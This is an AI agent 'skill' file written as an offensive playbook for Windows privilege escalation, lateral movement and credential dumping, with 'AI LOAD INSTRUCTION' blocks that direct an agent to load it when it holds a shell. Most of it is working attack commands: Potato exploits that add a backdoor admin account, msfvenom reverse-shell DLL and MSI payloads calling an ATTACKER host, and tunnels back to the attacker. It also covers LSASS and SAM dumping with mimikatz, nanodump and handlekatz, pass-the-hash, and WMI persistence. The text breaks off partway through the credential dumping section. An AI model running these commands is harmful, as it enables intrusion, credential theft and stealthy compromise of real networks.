---
name: privesc-windows
description: >-
  Windows complete privilege escalation chain. Covers local privesc (token abuse/Potato family/service misconfig/DLL hijack/UAC bypass), lateral movement (PsExec/WMI/WinRM/DCOM/PTH/PTT/RDP), credential dumping (LSASS/SAM/NTDS/DCC2/handlekatz), and AV/EDR evasion (AMSI bypass/ETW patch/indirect syscalls/sleep obfuscation/module stomping). Load when you have a Windows shell and need to escalate, move laterally, or evade defenses.
---

# Windows Privilege Escalation — Complete Attack Chain

## Internal Navigation

| Section | Content |
|---|---|
| Part 1 | Local Privilege Escalation |
| Part 2 | Token Manipulation & Potato Family |
| Part 3 | Lateral Movement |
| Part 4 | Credential Dumping |
| Part 5 | AV/EDR Evasion |
| Part 6 | AMSI Bypass Techniques |

---

# Part 1: Local Privilege Escalation


# SKILL: Windows Local Privilege Escalation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert Windows privesc techniques. Covers token manipulation, Potato family, service misconfigurations, DLL hijacking, AlwaysInstallElevated, scheduled task abuse, registry autoruns, and named pipe impersonation. Base models miss nuanced privilege prerequisites and OS-version-specific constraints.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) after escalation for pivoting to other hosts
- [windows-av-evasion](../windows-av-evasion/SKILL.md) when AV/EDR blocks your privesc tools
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) when the host is domain-joined and you need AD-level escalation
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for domain privilege escalation via ACL misconfigurations

### Advanced Reference

Also load [TOKEN_POTATO_TRICKS.md](./TOKEN_POTATO_TRICKS.md) when you need:
- Detailed Potato family comparison (JuicyPotato → GodPotato evolution)
- OS-version-specific exploit selection
- Required privileges and protocol details per variant

Also load [UAC_BYPASS_METHODS.md](./UAC_BYPASS_METHODS.md) when you need:
- UAC bypass technique matrix (fodhelper, eventvwr, sdclt, etc.)
- Auto-elevate binary abuse
- Mock trusted directory tricks


## 1. ENUMERATION CHECKLIST

### System Context

```cmd
whoami /all                        & REM Current user, groups, privileges
systeminfo                         & REM OS version, hotfixes, architecture
hostname                           & REM Machine name
net user %USERNAME%                & REM Group memberships
```

### Token Privileges (Critical)

```cmd
whoami /priv
```

| Privilege | Escalation Path |
|---|---|
| `SeImpersonatePrivilege` | Potato family exploits (§2) |
| `SeAssignPrimaryTokenPrivilege` | Token manipulation, Potato variants |
| `SeDebugPrivilege` | Dump LSASS, inject into SYSTEM processes |
| `SeBackupPrivilege` | Read any file (SAM/SYSTEM/NTDS.dit) |
| `SeRestorePrivilege` | Write any file (DLL hijack, service binary) |
| `SeTakeOwnershipPrivilege` | Take ownership of any object |
| `SeLoadDriverPrivilege` | Load vulnerable kernel driver → kernel exploit |

### Services & Scheduled Tasks

```cmd
sc query state= all                & REM All services
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
schtasks /query /fo LIST /v        & REM Verbose scheduled task list
```

### Installed Software & Patches

```cmd
wmic product get name,version
wmic qfe list                      & REM Installed patches
```

### Network & Credentials

```cmd
netstat -ano                       & REM Listening ports + PIDs
cmdkey /list                       & REM Stored credentials
dir C:\Users\*\AppData\Local\Microsoft\Credentials\*
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
```

---

## 2. TOKEN MANIPULATION & POTATO EXPLOITS

### SeImpersonatePrivilege Abuse

Service accounts (IIS AppPool, MSSQL, etc.) typically hold `SeImpersonatePrivilege`. This enables impersonation of any token presented to you.

| Tool | OS Support | Protocol | Notes |
|---|---|---|---|
| **JuicyPotato** | Win7–Server2016 | COM/DCOM | Requires valid CLSID; patched on Server2019+ |
| **RoguePotato** | Server2019+ | OXID resolver redirect | Needs controlled machine on port 135 |
| **PrintSpoofer** | Win10/Server2016-2019 | Named pipe via Print Spooler | Simple, fast; Spooler must run |
| **SweetPotato** | Broad | COM + Print + EFS | Combines multiple techniques |
| **GodPotato** | Win8–Server2022 | DCOM RPCSS | Works on latest patched systems |

```cmd
# PrintSpoofer (simplest for modern systems)
PrintSpoofer64.exe -i -c "cmd /c whoami"

# GodPotato (broadest compatibility)
GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"

# JuicyPotato (legacy systems)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {CLSID}
```

### SeDebugPrivilege Abuse

```powershell
# Dump LSASS (if SeDebugPrivilege is enabled)
procdump -ma lsass.exe lsass.dmp

# Or migrate into a SYSTEM process
# Meterpreter: migrate to winlogon.exe / services.exe
```

---

## 3. SERVICE MISCONFIGURATIONS

### Unquoted Service Paths

```cmd
# Find unquoted paths with spaces
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

If path is `C:\Program Files\My App\service.exe`, Windows tries:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My App\service.exe`

Place malicious binary at first writable location.

### Weak Service Permissions

```cmd
# Check service ACL with accesschk (Sysinternals)
accesschk64.exe -wuvc * /accepteula
# Look for: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
```

```cmd
# Reconfigure service to run attacker binary
sc config vuln_svc binpath= "C:\temp\rev.exe"
sc stop vuln_svc
sc start vuln_svc
```

### Writable Service Binaries

```cmd
# Check if current user can write to the service binary path
icacls "C:\Program Files\VulnApp\service.exe"
# (F) = Full, (M) = Modify, (W) = Write → replace binary
```

---

## 4. DLL HIJACKING

### DLL Search Order (Standard)

1. Directory of the executable
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Current directory
6. Directories in `%PATH%`

### Exploitation

```cmd
# Find missing DLLs (use Process Monitor)
# Filter: Result=NAME NOT FOUND, Path ends with .dll

# Compile malicious DLL
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll > evil.dll

# Place in writable directory that comes before the real DLL location
```

### Known Phantom DLL Targets

| Application | Missing DLL | Drop Location |
|---|---|---|
| Various .NET apps | `profapi.dll` | Application directory |
| Windows services | `wlbsctrl.dll` | `%PATH%` writable dir |
| Third-party updaters | `VERSION.dll` | Application directory |

---

## 5. ALWAYSINSTALLELEVATED

```cmd
# Check both registry keys — BOTH must be set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```cmd
# Generate MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 6. SCHEDULED TASK ABUSE

```cmd
# Enumerate tasks with writable scripts or missing binaries
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User\|Schedule Type"

# Check permissions on task binary
icacls "C:\path\to\task\binary.exe"

# If writable: replace binary, wait for task execution
# If missing: place your binary at the expected path
```

### Scheduled Task via PowerShell

```powershell
# If you can create tasks (unlikely from low priv, useful post-UAC-bypass)
$action = New-ScheduledTaskAction -Execute "C:\temp\rev.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger -User "SYSTEM"
```

---

## 7. REGISTRY AUTORUNS

```cmd
# Check writable autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check permissions with accesschk
accesschk64.exe -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /accepteula
```

If an autorun entry points to a writable path → replace binary or inject new entry.

---

## 8. NAMED PIPE IMPERSONATION

```powershell
# Service account creates a named pipe, tricks a SYSTEM process into connecting
# The connecting client's token is then impersonated

# PrintSpoofer leverages this with the Print Spooler:
PrintSpoofer64.exe -i -c powershell.exe
```

Custom named pipe server (requires SeImpersonatePrivilege):
```powershell
# Create pipe → coerce SYSTEM connection → ImpersonateNamedPipeClient() → SYSTEM token
```

---

## 9. AUTOMATED TOOLS

| Tool | Purpose | Command |
|---|---|---|
| **winPEAS** | Comprehensive Windows enumeration | `winPEASx64.exe` |
| **PowerUp** | Service/DLL/registry misconfig checks | `Invoke-AllChecks` |
| **Seatbelt** | Security-focused host survey | `Seatbelt.exe -group=all` |
| **SharpUp** | C# port of PowerUp checks | `SharpUp.exe audit` |
| **PrivescCheck** | PowerShell privesc checker | `Invoke-PrivescCheck` |
| **BeRoot** | Common misconfig finder | `beRoot.exe` |

---

## 10. PRIVILEGE ESCALATION DECISION TREE

```
Low-privilege shell on Windows
│
├── whoami /priv → SeImpersonatePrivilege?
│   ├── Yes → Potato family (§2)
│   │   ├── Server2019+/Win11 → GodPotato or PrintSpoofer
│   │   ├── Server2016/Win10 → PrintSpoofer or SweetPotato
│   │   └── Older → JuicyPotato (need CLSID)
│   └── SeDebugPrivilege? → LSASS dump / process injection
│
├── Service misconfigurations?
│   ├── Unquoted path with spaces + writable dir? → binary plant (§3)
│   ├── SERVICE_CHANGE_CONFIG on service? → reconfigure binpath (§3)
│   └── Writable service binary? → replace executable (§3)
│
├── DLL hijacking opportunity?
│   ├── Missing DLL in search path? → plant malicious DLL (§4)
│   └── Writable directory in %PATH%? → DLL plant (§4)
│
├── AlwaysInstallElevated set?
│   └── Both HKLM+HKCU = 1 → MSI payload (§5)
│
├── Scheduled task abuse?
│   ├── Task runs as SYSTEM with writable binary? → replace (§6)
│   └── Task references missing binary? → plant binary (§6)
│
├── Registry autorun writable?
│   └── Writable binary path → replace on next login/reboot (§7)
│
├── UAC bypass needed? (medium integrity → high integrity)
│   └── Load UAC_BYPASS_METHODS.md
│
├── Stored credentials?
│   ├── cmdkey /list → runas /savecred
│   ├── Autologon in registry? → plaintext creds
│   └── WiFi passwords, browser creds, DPAPI
│
└── None of the above?
    ├── Run winPEAS for comprehensive scan
    ├── Check internal services (netstat -ano)
    ├── Look for sensitive files (unattend.xml, web.config, *.config)
    └── Check for kernel exploits (systeminfo → Windows Exploit Suggester)
```


---

# Part 2: Token Manipulation & Potato Family


## 1. TOKEN PRIVILEGE PRIMER

### Privilege → Attack Mapping

| Token Privilege | Attack Vector | Tools |
|---|---|---|
| `SeImpersonatePrivilege` | Impersonate any token presented to you → Potato exploits | All Potato variants |
| `SeAssignPrimaryTokenPrivilege` | Assign token to new process → create SYSTEM process | TokenManipulation, Potato variants |
| `SeDebugPrivilege` | Open any process → inject/dump SYSTEM processes | Mimikatz, procdump |
| `SeBackupPrivilege` | Read any file ignoring DACL → extract SAM/SYSTEM/NTDS | reg save, robocopy /b |
| `SeRestorePrivilege` | Write any file ignoring DACL → DLL hijack, service binary | copy/move to restricted paths |
| `SeTakeOwnershipPrivilege` | Take ownership of any securable object | takeown, icacls |
| `SeLoadDriverPrivilege` | Load kernel driver → kernel-level exploit | Capcom.sys exploit chain |
| `SeManageVolumePrivilege` | Volume operations → arbitrary file read/write | Exploit via Volume Shadow Copy |

### How Token Impersonation Works

```
1. Attacker (service account) creates a named pipe / COM server
2. SYSTEM-level process connects (coerced or naturally)
3. Attacker calls ImpersonateNamedPipeClient() or similar
4. Attacker's thread now runs with SYSTEM token
5. Use CreateProcessWithTokenW() to spawn SYSTEM shell
```


## 2. POTATO FAMILY EVOLUTION

### Timeline & Motivation

```
2016: Hot Potato     — NBNS spoofing + WPAD + NTLM relay (patched)
2018: JuicyPotato    — COM/DCOM activation with custom CLSID
2019: RoguePotato    — OXID resolver redirect for Server2019
2020: PrintSpoofer   — Named pipe via Print Spooler service
2021: SweetPotato    — Combines multiple coercion techniques
2022: GodPotato      — DCOM RPCSS direct, broad OS support
2023: EfsPotato      — EFS RPC named pipe token capture
```

---

## 3. DETAILED COMPARISON MATRIX

| Feature | JuicyPotato | RoguePotato | PrintSpoofer | SweetPotato | GodPotato | EfsPotato |
|---|---|---|---|---|---|---|
| **Required Priv** | SeImpersonate/SeAssignPrimary | SeImpersonate | SeImpersonate | SeImpersonate | SeImpersonate | SeImpersonate |
| **Win7** | Yes | No | No | Partial | No | No |
| **Win8/8.1** | Yes | No | No | Partial | Yes | No |
| **Win10 (1809-)** | Yes | No | Yes | Yes | Yes | Yes |
| **Win10 (1903+)** | No (patched) | Yes | Yes | Yes | Yes | Yes |
| **Win11** | No | Yes | Yes | Yes | Yes | Yes |
| **Server 2012/R2** | Yes | No | No | Partial | Yes | No |
| **Server 2016** | Yes | No | Yes | Yes | Yes | Yes |
| **Server 2019** | No (patched) | Yes | Yes | Yes | Yes | Yes |
| **Server 2022** | No | Yes | Yes | Yes | Yes | Yes |
| **Protocol** | DCOM (CLSID) | OXID redirect | Named Pipe (Spooler) | COM + Spooler + EFS | DCOM RPCSS | EFS RPC |
| **External Req** | Valid CLSID list | Port 135 redirect | Print Spooler running | None specific | None | EFS service |
| **Detection Risk** | Medium | Medium-High | Low | Low-Medium | Low | Low |
| **Complexity** | Need CLSID | Need network redirect | Simple | Simple | Simple | Simple |

---

## 4. TOOL USAGE — COMMAND REFERENCE

### JuicyPotato

```cmd
# List valid CLSIDs for the OS version (from juicy-potato GitHub)
# https://github.com/ohpe/juicy-potato/tree/master/CLSID

JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\temp\out.txt" -t * -c {CLSID}

# Common CLSIDs:
# {4991d34b-80a1-4291-83b6-3328366b9097}  Windows 10
# {e60687f7-01a1-40aa-86ac-db1cbf673334}  Server 2016
```

### RoguePotato

```cmd
# On attacker machine: redirect OXID resolution (port 135)
socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999

# On target:
RoguePotato.exe -r ATTACKER_IP -l 9999 -e "cmd.exe /c whoami"
```

### PrintSpoofer

```cmd
# Interactive SYSTEM shell
PrintSpoofer64.exe -i -c cmd.exe

# Execute command as SYSTEM
PrintSpoofer64.exe -c "cmd /c net user hacker P@ss! /add"

# Works from a service context (IIS, MSSQL)
```

### SweetPotato

```cmd
# Auto-selects best technique
SweetPotato.exe -e EfsRpc -p C:\temp\rev.exe
SweetPotato.exe -e PrintSpoofer -p cmd.exe -a "/c whoami"

# Techniques: WinRM, EfsRpc, PrintSpoofer
```

### GodPotato

```cmd
# Broadest modern compatibility
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net localgroup administrators hacker /add"

# .NET version requirements: .NET 2.0 / 3.5 / 4.x variants available
```

---

## 5. SeBackupPrivilege EXPLOITATION

```cmd
# Method 1: Registry hive extraction
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY
# Transfer to attacker → secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Method 2: robocopy with backup flag
robocopy /b C:\Windows\NTDS C:\temp ntds.dit
# Then extract with secretsdump
```

### PowerShell Approach

```powershell
# Import required DLL methods for backup privilege
# Set-SeBackupPrivilege then copy NTDS.dit
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege "C:\Windows\NTDS\ntds.dit" "C:\temp\ntds.dit"
```

---

## 6. SeLoadDriverPrivilege EXPLOITATION

```
1. Compile or obtain a vulnerable signed driver (e.g., Capcom.sys)
2. Create registry key: HKCU\System\CurrentControlSet\MyDriver
   - Set ImagePath to \\?\C:\temp\Capcom.sys
   - Set Type to 1
3. Call NtLoadDriver() to load the driver
4. Exploit the vulnerable driver for kernel code execution
5. Use kernel access to steal SYSTEM token
```

```cmd
# Using EoPLoadDriver
EoPLoadDriver.exe System\CurrentControlSet\MyDriver C:\temp\Capcom.sys
# Then use ExploitCapcom.exe to execute command as SYSTEM
ExploitCapcom.exe cmd.exe
```

---

## 7. POTATO SELECTION DECISION TREE

```
Have SeImpersonatePrivilege?
│
├── What OS version?
│   │
│   ├── Windows 7 / Server 2008R2
│   │   └── JuicyPotato (find valid CLSID for this OS)
│   │
│   ├── Windows 8/8.1 / Server 2012/2012R2
│   │   ├── JuicyPotato (first choice)
│   │   └── GodPotato (if JP fails)
│   │
│   ├── Windows 10 (1607-1809) / Server 2016
│   │   ├── PrintSpoofer (if Spooler runs)
│   │   ├── JuicyPotato (find CLSID)
│   │   └── GodPotato
│   │
│   ├── Windows 10 (1903+) / Server 2019
│   │   ├── PrintSpoofer (if Spooler runs)
│   │   ├── GodPotato (recommended)
│   │   ├── RoguePotato (if you control port 135 redirect)
│   │   └── SweetPotato (auto-selection)
│   │
│   └── Windows 11 / Server 2022
│       ├── GodPotato (recommended — broadest compat)
│       ├── PrintSpoofer (if Spooler runs)
│       └── SweetPotato (fallback)
│
├── Print Spooler service running?
│   ├── Yes → PrintSpoofer (fastest, cleanest)
│   └── No → GodPotato or RoguePotato
│
└── All fail?
    ├── Check if EFS service runs → EfsPotato
    ├── Try SweetPotato (rotates techniques)
    └── Consider named pipe impersonation manually
```


---

# Part 3: Lateral Movement


# SKILL: Windows Lateral Movement — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert Windows lateral movement techniques. Covers PsExec, WMI, WinRM, DCOM, SMB, RDP, SSH, pass-the-hash, overpass-the-hash, pass-the-ticket, and pivoting. Base models miss execution method fingerprints, OPSEC trade-offs, and credential type requirements per method.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) after landing on a new host for local escalation
- [windows-av-evasion](../windows-av-evasion/SKILL.md) when EDR blocks lateral movement tools
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos-based lateral (pass-the-ticket, delegation)
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL-based paths to new hosts

### Advanced Reference

Also load [CREDENTIAL_DUMPING.md](./CREDENTIAL_DUMPING.md) when you need:
- LSASS dump techniques (MiniDump, comsvcs.dll, nanodump)
- SAM/SYSTEM/SECURITY extraction
- DPAPI, credential manager, cached domain credentials
- NTDS.dit extraction methods


## 1. REMOTE EXECUTION METHODS COMPARISON

| Method | Port | Cred Type | Creates Service? | File on Disk? | OPSEC | Admin Required? |
|---|---|---|---|---|---|---|
| **PsExec** | 445 (SMB) | Password/Hash | Yes (PSEXESVC) | Yes (.exe) | Low | Yes |
| **Impacket smbexec** | 445 | Password/Hash | Yes (temp service) | No | Medium | Yes |
| **Impacket atexec** | 445 | Password/Hash | No (scheduled task) | No | Medium | Yes |
| **WMI** | 135+dynamic | Password/Hash | No | No | High | Yes |
| **WinRM** | 5985/5986 | Password/Hash/Ticket | No | No | High | Yes (Remote Mgmt) |
| **DCOM** | 135+dynamic | Password/Hash | No | No | High | Yes |
| **RDP** | 3389 | Password/Hash (RestrictedAdmin) | No | No | Low (GUI session) | RDP access |
| **SSH** | 22 | Password/Key | No | No | High | SSH enabled |
| **SC** | 445 | Password/Hash | Yes (custom service) | Yes | Low | Yes |

---

## 2. PSEXEC VARIANTS

### Impacket PsExec

```bash
# With password
psexec.py DOMAIN/administrator:password@TARGET_IP

# With NTLM hash (pass-the-hash)
psexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# With Kerberos ticket
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com
```

### Impacket smbexec (Stealthier — No Binary Upload)

```bash
smbexec.py DOMAIN/administrator:password@TARGET_IP
smbexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP
```

### Impacket atexec (Scheduled Task)

```bash
atexec.py DOMAIN/administrator:password@TARGET_IP "whoami"
atexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP "whoami"
```

### Sysinternals PsExec

```cmd
PsExec64.exe \\TARGET -u DOMAIN\administrator -p password cmd.exe
PsExec64.exe \\TARGET -s cmd.exe    & REM Run as SYSTEM (-s)
PsExec64.exe \\TARGET -accepteula -s -d cmd.exe /c "C:\temp\payload.exe"
```

---

## 3. WMI LATERAL MOVEMENT

```bash
# Impacket wmiexec
wmiexec.py DOMAIN/administrator:password@TARGET_IP
wmiexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# With Kerberos
export KRB5CCNAME=admin.ccache
wmiexec.py -k -no-pass DOMAIN/administrator@target.domain.com
```

```powershell
# PowerShell WMI process creation
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt" -ComputerName TARGET -Credential $cred

# WMI event subscription persistence
$filterArgs = @{
    EventNamespace = 'root\cimv2'; Name = 'Updater';
    QueryLanguage = 'WQL';
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
```

---

## 4. WINRM LATERAL MOVEMENT

```bash
# evil-winrm (from Linux — with password)
evil-winrm -i TARGET_IP -u administrator -p password

# evil-winrm (with hash)
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH

# evil-winrm (with Kerberos)
evil-winrm -i target.domain.com -r DOMAIN.COM
```

```powershell
# PowerShell remoting
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred

# Execute command remotely
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }

# Multiple targets simultaneously
Invoke-Command -ComputerName TARGET1,TARGET2 -Credential $cred -ScriptBlock { hostname; whoami }
```

---

## 5. DCOM LATERAL MOVEMENT

Stealthy — uses legitimate COM objects, no service creation.

### MMC20.Application

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\temp\out.txt","7")
```

### ShellWindows

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\temp\out.txt","C:\Windows\System32",$null,0)
```

### ShellBrowserWindow

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","TARGET"))
$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

### Impacket dcomexec

```bash
dcomexec.py DOMAIN/administrator:password@TARGET_IP
dcomexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP -object MMC20
```

---

## 6. PASS-THE-HASH (PTH)

Use NTLM hash directly without knowing the plaintext password.

```bash
# CrackMapExec — spray/check admin access
crackmapexec smb TARGETS -u administrator -H NTLM_HASH

# Impacket tools (all support -hashes)
psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
smbexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET

# evil-winrm
evil-winrm -i TARGET -u user -H NTLM_HASH

# xfreerdp (Restricted Admin mode must be enabled)
xfreerdp /v:TARGET /u:administrator /pth:NTLM_HASH /d:DOMAIN
```

```cmd
# Mimikatz PTH (spawns new process with injected creds)
sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

### Enable Restricted Admin for RDP PTH

```cmd
# On target (requires admin): enable restricted admin
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

---

## 7. OVERPASS-THE-HASH (PASS-THE-KEY)

Convert NTLM hash → Kerberos TGT → pure Kerberos authentication.

```bash
# Request TGT with hash
getTGT.py DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache

# Or with AES256 key
getTGT.py DOMAIN/user -aesKey AES256_KEY -dc-ip DC_IP

# Use Kerberos for all subsequent tools
psexec.py -k -no-pass DOMAIN/user@target.domain.com
wmiexec.py -k -no-pass DOMAIN/user@target.domain.com
```

```cmd
# Mimikatz overpass-the-hash
sekurlsa::pth /user:user /domain:DOMAIN /ntlm:HASH /run:powershell.exe
# New PowerShell session → klist shows Kerberos TGT
```

**Advantage**: Pure Kerberos auth avoids NTLM logging and detection.

---

## 8. PASS-THE-TICKET

```bash
# Use existing .ccache ticket
export KRB5CCNAME=/path/to/admin.ccache
psexec.py -k -no-pass DOMAIN/admin@target.domain.com
```

```cmd
# Mimikatz — inject .kirbi ticket
kerberos::ptt ticket.kirbi
# Verify
klist

# Rubeus
Rubeus.exe ptt /ticket:base64_blob
```

---

## 9. PIVOTING THROUGH COMPROMISED HOSTS

### SSH Tunnel / Port Forward

```bash
# Dynamic SOCKS proxy through compromised host
ssh -D 1080 user@COMPROMISED_HOST
# Use with proxychains

# Local port forward (access internal service)
ssh -L 8888:INTERNAL_TARGET:445 user@COMPROMISED_HOST
```

### Chisel (No SSH Needed)

```bash
# On attacker (server)
chisel server --reverse -p 8080

# On compromised host (client)
chisel client ATTACKER:8080 R:socks
# Creates SOCKS5 proxy on attacker's port 1080
```

### Ligolo-ng (Modern, Fast)

```bash
# On attacker
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On compromised host
ligolo-agent -connect ATTACKER:11601 -retry -ignore-cert

# In ligolo console
session          # Select agent
start            # Start tunnel
# Add route: sudo ip route add INTERNAL_SUBNET/24 dev ligolo
```

---

## 10. LATERAL MOVEMENT DECISION TREE

```
Have credentials / hash — need to move laterally
│
├── What credentials do you have?
│   ├── Plaintext password → any method
│   ├── NTLM hash → PTH methods (§6)
│   │   ├── Need stealthier? → Overpass-the-Hash first (§7)
│   │   └── Direct use → psexec/wmiexec/evil-winrm with -H
│   ├── Kerberos ticket → Pass-the-Ticket (§8)
│   └── AES key → Overpass-the-Hash with -aesKey (§7)
│
├── OPSEC priority?
│   ├── High stealth needed
│   │   ├── WMI (no file on disk, no service) → wmiexec (§3)
│   │   ├── DCOM (uses legitimate COM) → dcomexec (§5)
│   │   └── WinRM (PowerShell remoting) → evil-winrm (§4)
│   ├── Moderate stealth
│   │   ├── smbexec (no binary upload) (§2)
│   │   └── atexec (scheduled task, auto-cleanup) (§2)
│   └── Low stealth acceptable
│       ├── PsExec (reliable, creates service) (§2)
│       └── RDP (interactive GUI) (§6)
│
├── Need to pivot to internal network?
│   ├── SSH available → SSH tunnel / SOCKS (§9)
│   ├── No SSH → Chisel or Ligolo-ng (§9)
│   └── Multiple hops → chain SOCKS proxies
│
├── Target hardening?
│   ├── SMB signing required → WMI, WinRM, or DCOM
│   ├── WinRM disabled → WMI or DCOM
│   ├── Firewall blocks 135/445 → RDP or SSH
│   └── Restricted Admin disabled → no RDP PTH → use other methods
│
└── Need to dump creds on new host?
    └── Load CREDENTIAL_DUMPING.md
```


---

# Part 4: Credential Dumping


## 1. LSASS MEMORY DUMP TECHNIQUES

### Method Comparison

| Method | Tool | AV Detection Risk | Requires | Notes |
|---|---|---|---|---|
| MiniDump (comsvcs.dll) | Built-in Windows DLL | Medium | Admin + SeDebugPrivilege | Commonly monitored |
| ProcDump | Sysinternals (signed) | Medium-High | Admin | Microsoft-signed, but well-known |
| Mimikatz | Custom | High | Admin + SeDebugPrivilege | Most capable, most detected |
| nanodump | Custom | Low | Admin + SeDebugPrivilege | Uses MiniDumpWriteDump variants |
| handlekatz | Custom | Low | Admin | Clone LSASS handle, then dump |
| PPLdump | Custom | Low | Admin | Bypass PPL (Protected Process Light) |
| lsassy | Remote (Impacket) | Medium | Admin SMB access | Remote dump + parse, no disk touch |

### comsvcs.dll MiniDump

```cmd
# Find LSASS PID
tasklist /fi "imagename eq lsass.exe"

# Dump using comsvcs.dll (built-in Windows DLL)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID C:\temp\lsass.dmp full
```

```powershell
# PowerShell variant
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\temp\lsass.dmp full
```

### ProcDump (Sysinternals)

```cmd
procdump -ma lsass.exe lsass.dmp -accepteula
```

### Mimikatz (Direct Memory Read)

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest           & REM WDigest plaintext (if enabled)
mimikatz # sekurlsa::kerberos          & REM Kerberos tickets
mimikatz # sekurlsa::msv               & REM NTLM hashes
```

### nanodump (EDR Evasion)

```cmd
# Direct syscalls, unhooks NTDLL, avoids API hooks
nanodump.exe --write C:\temp\lsass.dmp
nanodump.exe --fork --write C:\temp\lsass.dmp   & REM Fork process first (stealthier)
```

### handlekatz

```cmd
# Clone LSASS handle from another process (avoids direct LSASS open)
handlekatz.exe --pid LSASS_PID --outfile C:\temp\lsass.dmp
```

### Remote Dump with lsassy

```bash
# From Linux — dump and parse remotely
lsassy -u administrator -p password TARGET_IP
lsassy -u administrator -H NTLM_HASH TARGET_IP

# Specific dump method
lsassy -u administrator -p password TARGET_IP -m comsvcs
lsassy -u administrator -p password TARGET_IP -m nanodump
```

### Parse Dump Offline

```bash
# Mimikatz offline parsing
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# pypykatz (Python, cross-platform)
pypykatz lsa minidump lsass.dmp
```


## 2. SAM / SYSTEM / SECURITY HIVE EXTRACTION

### Local Extraction

```cmd
# reg save (requires admin)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Volume Shadow Copy
vssadmin create shadow /for=C:
